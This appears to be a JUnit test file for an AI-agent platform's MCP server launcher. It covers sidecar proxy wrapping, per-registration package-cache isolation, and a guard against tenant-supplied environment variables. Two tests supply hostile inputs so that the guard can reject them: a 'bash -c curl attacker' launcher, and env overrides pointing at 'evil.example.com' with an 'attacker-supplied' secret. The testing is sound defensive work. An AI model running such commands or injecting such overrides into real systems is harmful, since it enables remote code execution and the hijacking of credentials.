package com.agenticai.core.agents.tools;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.agenticai.core.mcp.McpCatalogService;
import com.agenticai.core.mcp.McpConnectionPhase;
import com.agenticai.core.mcp.McpConnectionStatus;
import com.agenticai.core.mcp.McpRegistryService;
import com.agenticai.core.mcp.McpRemoteUrlGuard;
import com.agenticai.core.mcp.McpReviewStatus;
import com.agenticai.core.mcp.McpServerType;
import com.agenticai.core.mcp.McpStdioCommandGuard;
import com.agenticai.core.mcp.McpUsageStatus;
import com.agenticai.core.mcp.atlassian.AtlassianOAuthService;
import com.agenticai.core.mcp.dto.McpDynamicConfig;
import com.agenticai.core.mcp.dto.McpServerRegistrationResponse;
import com.agenticai.core.security.TenantContext;
import com.agenticai.core.tenancy.TenantSchemaIterator;
import io.micrometer.core.instrument.simple.SimpleMeterRegistry;
import io.modelcontextprotocol.client.McpSyncClient;
import io.modelcontextprotocol.client.transport.ServerParameters;
import io.modelcontextprotocol.spec.McpClientTransport;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.http.HttpClient;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.UUID;
import org.junit.jupiter.api.Test;
import org.springframework.ai.tool.ToolCallback;
import org.springframework.beans.factory.ObjectProvider;

/** STDIO launch parameters, sidecar wrapping and package-cache hygiene via the manager. */
class McpStdioParamsTest extends DynamicMcpConnectionManagerTestBase {

    @Test
    void wrapForSidecarPointsAtTheLocalProxyAndCarriesTheRealTargetAsControlEnvVars() {
        McpStdioSidecarProperties props = new McpStdioSidecarProperties();
        props.setEnabled(true);
        props.setAddress("mcp-stdio-runner:8097");
        props.setSharedSecret("s3cr3t");
        DynamicMcpConnectionManager manager =
                newManagerWithSidecar(
                        mock(McpRegistryService.class), mock(TenantSchemaIterator.class), props);

        ServerParameters params =
                manager.wrapForSidecar(
                        "npx",
                        List.of("-y", "@modelcontextprotocol/server-brave-search"),
                        Map.of("BRAVE_API_KEY", "sk-abc123"));

        assertEquals("node", params.getCommand());
        assertEquals(List.of("/opt/mcp-stdio-proxy/proxy.js"), params.getArgs());
        Map<String, String> env = params.getEnv();
        assertEquals("mcp-stdio-runner:8097", env.get("MCP_SIDECAR_URL"));
        assertEquals("s3cr3t", env.get("MCP_SIDECAR_SECRET"));
        assertEquals("npx", env.get("MCP_SIDECAR_TARGET_COMMAND"));
        assertEquals(
                "[\"-y\",\"@modelcontextprotocol/server-brave-search\"]",
                env.get("MCP_SIDECAR_TARGET_ARGS_JSON"));
        // SEC-030: the registration's own env is NOT the relay's process env (the relay is a
        // node process inside core) - it travels as JSON data the relay puts in the control
        // frame, so the ACTUAL child (running in the sidecar) still gets it.
        assertEquals(null, env.get("BRAVE_API_KEY"));
        assertEquals("{\"BRAVE_API_KEY\":\"sk-abc123\"}", env.get("MCP_SIDECAR_TARGET_ENV_JSON"));
    }

    @Test
    void wrapForSidecarControlVarsWinOverAColludingTenantEnvKey() {
        // A tenant's own configured env must never be able to override where the
        // relay connects or what secret it presents - the control vars are
        // written into the merged map AFTER the real env is copied in, so they
        // always win on a key collision.
        McpStdioSidecarProperties props = new McpStdioSidecarProperties();
        props.setAddress("mcp-stdio-runner:8097");
        props.setSharedSecret("real-secret");
        DynamicMcpConnectionManager manager =
                newManagerWithSidecar(
                        mock(McpRegistryService.class), mock(TenantSchemaIterator.class), props);

        ServerParameters params =
                manager.wrapForSidecar(
                        "npx",
                        List.of(),
                        Map.of(
                                "MCP_SIDECAR_SECRET",
                                "attacker-supplied",
                                "MCP_SIDECAR_URL",
                                "evil.example.com:1"));

        assertEquals("real-secret", params.getEnv().get("MCP_SIDECAR_SECRET"));
        assertEquals("mcp-stdio-runner:8097", params.getEnv().get("MCP_SIDECAR_URL"));
    }

    @Test
    void stdioParamsForSpawnsTheRealCommandDirectlyWhenSidecarModeIsDisabled()
            throws ReflectiveOperationException {
        // The default - proves sidecar mode being wired in at all does not
        // change today's behavior when it's off (McpStdioSidecarProperties'
        // own default), same guarantee newManager()'s own doc comment states.
        // Uses "uvx" rather than "npx" deliberately - normalizeCommandForWindows
        // rewrites literally "npx" to "npx.cmd" on a Windows host (see that
        // method's own javadoc), which would make this assertion host-OS-
        // dependent for a reason unrelated to what this test is actually about.
        McpDynamicConfig config =
                new McpDynamicConfig(
                        UUID.randomUUID(),
                        "some-server",
                        McpServerType.STDIO,
                        "uvx",
                        List.of("some-pkg"),
                        Map.of(),
                        null);
        DynamicMcpConnectionManager manager =
                newManager(mock(McpRegistryService.class), mock(TenantSchemaIterator.class));

        ServerParameters params = invokeStdioParamsFor(manager, config);

        assertEquals("uvx", params.getCommand());
        assertEquals(List.of("some-pkg"), params.getArgs());
    }

    @Test
    void stdioParamsForRoutesThroughTheProxyWhenSidecarModeIsEnabled()
            throws ReflectiveOperationException {
        McpDynamicConfig config =
                new McpDynamicConfig(
                        UUID.randomUUID(),
                        "brave-search",
                        McpServerType.STDIO,
                        "npx",
                        List.of("-y", "some-pkg"),
                        Map.of(),
                        null);
        McpStdioSidecarProperties props = new McpStdioSidecarProperties();
        props.setEnabled(true);
        DynamicMcpConnectionManager manager =
                newManagerWithSidecar(
                        mock(McpRegistryService.class), mock(TenantSchemaIterator.class), props);

        ServerParameters params = invokeStdioParamsFor(manager, config);

        assertEquals("node", params.getCommand());
        assertEquals("npx", params.getEnv().get("MCP_SIDECAR_TARGET_COMMAND"));
        assertEquals("[\"-y\",\"some-pkg\"]", params.getEnv().get("MCP_SIDECAR_TARGET_ARGS_JSON"));
    }

    @Test
    void stdioParamsForStillRunsTheLauncherGuardBeforeWrappingForTheSidecar() {
        // The guard must see the REAL command/args/env, not the proxy wrapper -
        // a disallowed launcher must still be refused even in sidecar mode,
        // proving the wrap happens strictly after guard approval, never instead
        // of it.
        McpDynamicConfig config =
                new McpDynamicConfig(
                        UUID.randomUUID(),
                        "evil",
                        McpServerType.STDIO,
                        "bash",
                        List.of("-c", "curl attacker"),
                        Map.of(),
                        null);
        McpStdioSidecarProperties props = new McpStdioSidecarProperties();
        props.setEnabled(true);
        DynamicMcpConnectionManager manager =
                newManagerWithSidecar(
                        mock(McpRegistryService.class), mock(TenantSchemaIterator.class), props);

        ReflectiveOperationException thrown = null;
        try {
            invokeStdioParamsFor(manager, config);
        } catch (ReflectiveOperationException e) {
            thrown = e;
        }
        assertTrue(
                thrown != null && thrown.getCause() instanceof IllegalArgumentException,
                "a disallowed launcher must still be rejected by the guard before any sidecar wrapping happens");
    }

    /**
     * Live incident, 2026-08-12/13: see {@link
     * DynamicMcpConnectionManager#isolatedPackageCacheEnv}'s own javadoc. Every stdio spawn's env
     * must carry a cache dir unique to its own registration, not a shared {@code $HOME/.npm} every
     * concurrently-spawned server races to write into.
     */
    @Test
    void stdioParamsForGivesEachRegistrationItsOwnIsolatedPackageCacheDirs()
            throws ReflectiveOperationException, java.io.IOException {
        UUID regId = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        regId,
                        "github",
                        McpServerType.STDIO,
                        "uvx",
                        List.of("-y", "mcp-server-github"),
                        Map.of(),
                        null);
        DynamicMcpConnectionManager manager =
                newManager(mock(McpRegistryService.class), mock(TenantSchemaIterator.class));

        ServerParameters params = invokeStdioParamsFor(manager, config);

        assertEquals(cacheDir("npm-cache", regId), params.getEnv().get("npm_config_cache"));
        assertEquals(cacheDir("uv-cache", regId), params.getEnv().get("UV_CACHE_DIR"));
        assertEquals(cacheDir("uv-tools", regId), params.getEnv().get("UV_TOOL_DIR"));
        assertEquals(cacheDir("uv-bin", regId), params.getEnv().get("UV_TOOL_BIN_DIR"));
    }

    /**
     * Follow-up, 2026-08-13: see {@link DynamicMcpConnectionManager#isolatedPackageCacheEnv}'s
     * javadoc update - {@code UV_CACHE_DIR} alone wasn't enough for a {@code uvx}-launched server
     * (e.g. a2atlassian), which separately needs {@code UV_TOOL_DIR} to install into and {@code
     * UV_TOOL_BIN_DIR} to symlink its entrypoint into - both default to a shared, non-writable
     * {@code $HOME/.local/...} tree otherwise (live report: "failed to create directory
     * '/home/agentic/.local/share/uv/tools': Permission denied").
     */
    @Test
    void stdioParamsForGivesEachRegistrationItsOwnIsolatedUvToolDirs()
            throws ReflectiveOperationException, java.io.IOException {
        UUID regId = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        regId,
                        "a2atlassian",
                        McpServerType.STDIO,
                        "uvx",
                        List.of("--from", "a2atlassian", "a2atlassian-mcp"),
                        Map.of(),
                        null);
        DynamicMcpConnectionManager manager =
                newManager(mock(McpRegistryService.class), mock(TenantSchemaIterator.class));

        ServerParameters params = invokeStdioParamsFor(manager, config);

        assertEquals(cacheDir("uv-tools", regId), params.getEnv().get("UV_TOOL_DIR"));
        assertEquals(cacheDir("uv-bin", regId), params.getEnv().get("UV_TOOL_BIN_DIR"));
    }

    @Test
    void stdioParamsForCacheDirsDifferPerRegistration() throws ReflectiveOperationException {
        // The whole point: two DIFFERENT servers must never resolve to the same cache path,
        // or concurrent spawns at boot are right back to racing each other.
        DynamicMcpConnectionManager manager =
                newManager(mock(McpRegistryService.class), mock(TenantSchemaIterator.class));
        McpDynamicConfig configA =
                new McpDynamicConfig(
                        UUID.randomUUID(),
                        "server-a",
                        McpServerType.STDIO,
                        "npx",
                        List.of("-y", "pkg-a"),
                        Map.of(),
                        null);
        McpDynamicConfig configB =
                new McpDynamicConfig(
                        UUID.randomUUID(),
                        "server-b",
                        McpServerType.STDIO,
                        "npx",
                        List.of("-y", "pkg-b"),
                        Map.of(),
                        null);

        ServerParameters paramsA = invokeStdioParamsFor(manager, configA);
        ServerParameters paramsB = invokeStdioParamsFor(manager, configB);

        assertTrue(
                !paramsA.getEnv()
                        .get("npm_config_cache")
                        .equals(paramsB.getEnv().get("npm_config_cache")));
    }

    @Test
    void stdioParamsForRefusesATenantSuppliedNpmConfigVar() {
        // SEC-030: npm_config_* (cache/userconfig/registry/prefix...) is a blocked env family
        // now - a registration can no longer relocate npm's config or cache, so the platform's
        // per-registration cache default is the only value that ever reaches the child.
        McpDynamicConfig config =
                new McpDynamicConfig(
                        UUID.randomUUID(),
                        "custom",
                        McpServerType.STDIO,
                        "npx",
                        List.of("-y", "pkg"),
                        Map.of("npm_config_cache", "/opt/custom-npm-cache"),
                        null);
        DynamicMcpConnectionManager manager =
                newManager(mock(McpRegistryService.class), mock(TenantSchemaIterator.class));

        ReflectiveOperationException thrown = null;
        try {
            invokeStdioParamsFor(manager, config);
        } catch (ReflectiveOperationException e) {
            thrown = e;
        }
        assertTrue(
                thrown != null && thrown.getCause() instanceof IllegalArgumentException,
                "a tenant npm_config_* var must be refused by the spawn-time guard");
    }

    @Test
    void stdioParamsForLeavesCacheDirsToTheRunnerInSidecarMode()
            throws ReflectiveOperationException {
        // mcp-stdio-runner assigns every connection its own private cache/HOME dirs (its
        // RUNNER_OWNED_ENV) and ignores caller values, so core's direct-spawn cache defaults
        // are not relayed at all - which also lets the runner deny the npm_config_/UV_
        // families outright without refusing core's own defaults (SEC-030).
        UUID regId = UUID.randomUUID();
        McpDynamicConfig config =
                new McpDynamicConfig(
                        regId,
                        "github",
                        McpServerType.STDIO,
                        "npx",
                        List.of("-y", "mcp-server-github"),
                        Map.of(),
                        null);
        McpStdioSidecarProperties props = new McpStdioSidecarProperties();
        props.setEnabled(true);
        DynamicMcpConnectionManager manager =
                newManagerWithSidecar(
                        mock(McpRegistryService.class), mock(TenantSchemaIterator.class), props);

        ServerParameters params = invokeStdioParamsFor(manager, config);

        assertEquals(null, params.getEnv().get("npm_config_cache"));
        assertEquals("{}", params.getEnv().get("MCP_SIDECAR_TARGET_ENV_JSON"));
    }

    /**
     * {@link DynamicMcpConnectionManager#cleanupOrphanedPackageCaches} - the disk-hygiene
     * follow-up: a cache dir for a registration that no longer exists anywhere must be reclaimed,
     * but a cache dir for a registration that's still registered (even if currently disabled -
     * {@link McpRegistryService#listAll()} returns every registration regardless of enabled state)
     * must survive. Exercises the real sweep under the configured (temp, owner-only) base rather
     * than mocking file I/O; JUnit removes the fixture directories with the base.
     */
    @Test
    void cleanupOrphanedPackageCachesRemovesOnlyDirectoriesWithNoLiveRegistration()
            throws java.io.IOException {
        UUID liveId = UUID.randomUUID();
        UUID orphanId = UUID.randomUUID();
        java.nio.file.Path root = cacheBase.toRealPath().resolve("npm-cache");
        java.nio.file.Path liveDir = root.resolve(liveId.toString());
        java.nio.file.Path orphanDir = root.resolve(orphanId.toString());
        java.nio.file.Files.createDirectories(liveDir);
        java.nio.file.Files.createDirectories(orphanDir);
        java.nio.file.Files.writeString(orphanDir.resolve("leftover.txt"), "stale download");

        McpRegistryService registryService = mock(McpRegistryService.class);
        TenantSchemaIterator tenantSchemaIterator = mock(TenantSchemaIterator.class);
        McpServerRegistrationResponse liveResponse =
                new McpServerRegistrationResponse(
                        liveId,
                        "still-registered",
                        McpServerType.STDIO,
                        "desc",
                        true,
                        true,
                        "npx",
                        null,
                        null,
                        McpConnectionStatus.CONNECTED,
                        null,
                        null,
                        null,
                        McpUsageStatus.READY,
                        null,
                        null,
                        null,
                        null,
                        McpReviewStatus.NOT_REQUIRED,
                        null,
                        false,
                        false,
                        false,
                        List.of());
        when(registryService.listAll()).thenReturn(List.of(liveResponse));
        org.mockito.Mockito.doAnswer(
                        invocation -> {
                            java.util.function.Consumer<String> action = invocation.getArgument(0);
                            action.accept("test_tenant");
                            return null;
                        })
                .when(tenantSchemaIterator)
                .forEachActiveTenantSchema(any());

        DynamicMcpConnectionManager manager = newManager(registryService, tenantSchemaIterator);
        manager.cleanupOrphanedPackageCaches();

        assertTrue(
                java.nio.file.Files.exists(liveDir),
                "a still-registered id's cache dir must survive the sweep");
        assertTrue(
                !java.nio.file.Files.exists(orphanDir),
                "an id with no matching registration must be reclaimed");
    }

    // --- 2026-09-28: tools/list_changed refresh ----------------------------------------------
}
